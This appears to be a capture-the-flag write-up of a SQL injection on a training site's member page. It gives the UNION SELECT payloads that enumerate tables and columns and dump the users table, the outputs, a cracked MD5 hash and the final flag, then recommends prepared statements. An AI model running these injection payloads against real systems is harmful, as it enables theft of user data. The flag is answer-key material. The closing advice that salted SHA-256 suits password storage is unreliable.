# Where: <br>
    /?page=member
# How:
-By entering:

    -1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()

-We get the following output:

    ID: -1 union select null, concat (table_name) from information_schema.tables where table_schema = database () 
    First name: 
    Surname : users
    
-This tells us that the only table is *users*.

-We then enter:

    -1 union select null, concat (column_name) from information_schema.columns where table_schema = database ()

-We get the following output:

    ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
First name: 
Surname : user_id
ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
First name: 
Surname : first_name
ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
First name: 
Surname : last_name
ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
First name: 
Surname : town
ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
First name: 
Surname : country
ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
First name: 
Surname : planet
ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
First name: 
Surname : Commentaire
ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
First name: 
Surname : countersign

    
-This tells us that there are the following columns: *user_id*, *first_name*, *last_name*, *town*, *country*, *planet*, *Commentaire* and *countersign*.

-We then enter:

    -1 union select NULL, concat (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users

-We get all the users' information.
-The 5th user has the following info and instructions:

    user_id: 5,
    first_name: Flag,
    last_name: GetThe,
    town: 42,
    country: 42,
    planet: 42,
    Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !,
    countersign: 5ff9d0165b4f92b14994e5c685cdce28

-If we decrypt *5ff9d0165b4f92b14994e5c685cdce28* at [MD5 Online](https://www.md5online.org/md5-decrypt.html) we receive the word *FortyTwo*
-Which we change to all be lowercase then hash using sha256 at [sha256 hash calculator](https://xorbin.com/tools/sha256-hash-calculator) to receive the flag.

# Flag:
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

# Possible abuses:
Hackers could potentially access all info in your BD even hashed passwords could potentially be decrypted using sites.

# Fix:
Use [prepared statements](https://www.w3schools.com/php/php_mysql_prepared_statements.asp) to prevent sql injections.
I do also believe sha256 is a better hash to use especialy when combined with a salt.
